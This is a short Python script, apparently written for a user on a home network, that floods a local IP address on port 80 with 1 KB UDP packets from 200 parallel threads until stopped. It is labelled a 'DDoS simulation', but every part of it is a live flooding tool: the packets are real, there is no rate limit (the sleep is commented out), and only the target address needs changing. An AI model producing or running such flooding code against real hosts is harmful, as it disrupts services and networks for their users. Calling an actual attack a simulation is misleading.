import socket
import threading
import time
import random
import sys

# 🎯 CONFIGURATION
# Based on your ipconfig, your Gateway is 192.168.1.1
TARGET_IP = "192.168.1.7" 
TARGET_PORT = 80
THREAD_COUNT = 200   # Parallel threads

def attack_worker():
    # UDP socket for fast flooding
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 1024  # 1KB payload
    
    while True:
        try:
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
            # Tiny sleep to prevent crashing your own router immediately
            # time.sleep(0.01) 
        except Exception:
            pass

def start_simulation():
    print(f"\n[🔥] Launching DDoS SIMULATION against {TARGET_IP}...")
    print(f"     Threads: {THREAD_COUNT}")
    print("     Press Ctrl+C to stop.")

    threads = []
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack_worker, daemon=True)
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[🛑] Simulation Stopped.")

if __name__ == "__main__":
    start_simulation()